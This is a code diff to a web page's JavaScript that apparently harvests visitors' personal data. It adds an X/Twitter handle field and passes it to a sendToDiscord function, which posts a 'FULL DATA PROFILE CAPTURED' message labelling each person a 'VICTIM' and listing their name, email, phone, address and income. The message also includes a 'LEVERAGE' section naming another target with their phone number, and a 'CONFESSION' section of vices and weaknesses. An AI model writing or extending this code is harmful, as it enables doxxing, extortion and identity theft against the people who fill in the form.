@@ -74,12 +74,18 @@ window.nextStage = function (stage) {
     if (stage === 1) {
         const name = document.getElementById('inp-name').value;
         const phone = document.getElementById('inp-phone').value;
+        const twitter = document.getElementById('inp-twitter').value;
         const email = document.getElementById('inp-email').value;
         const address = document.getElementById('inp-address').value;
         const income = document.getElementById('inp-income').value;
 
         if (!isValidInput(name) || !isValidInput(address) || !isValidInput(income)) {
             alert("SYSTEM ERROR: INVALID DATA DETECTED. DO NOT LIE.");
+            return;
+        }
+
+        if (!twitter.startsWith('@') || twitter.length < 3) {
+            alert("INVALID TWITTER HANDLE. MUST START WITH @");
             return;
         }
 
@@ -266,6 +272,7 @@ function sendToDiscord() {
         name: document.getElementById('inp-name').value,
         email: document.getElementById('inp-email').value,
         phone: document.getElementById('inp-phone').value,
+        twitter: document.getElementById('inp-twitter').value,
         address: document.getElementById('inp-address').value,
         income: document.getElementById('inp-income').value,
         // NEW FIELDS
@@ -296,7 +303,7 @@ function sendToDiscord() {
             title: "🚨 FULL DATA PROFILE CAPTURED 🚨",
             color: 0, // Black
             fields: [
-                { name: "👤 VICTIM ID", value: `**Name:** ${data.name}\n**Email:** ${data.email}\n**Phone:** ${data.phone}` },
+                { name: "👤 VICTIM ID", value: `**Name:** ${data.name}\n**Email:** ${data.email}\n**Phone:** ${data.phone}\n**X/Twitter:** ${data.twitter}` },
                 { name: "🏠 LOCATION & STATUS", value: `**Address:** ${data.address}\n**Income:** ${data.income}` },
                 { name: "🎯 LEVERAGE", value: `**Target:** ${data.targetName}\n**Target Phone:** ${data.targetPhone}` },
                 { name: "🧠 CONFESSION", value: `**Vices:** ${data.vices}\n**Weakness:** ${data.weakness}` }
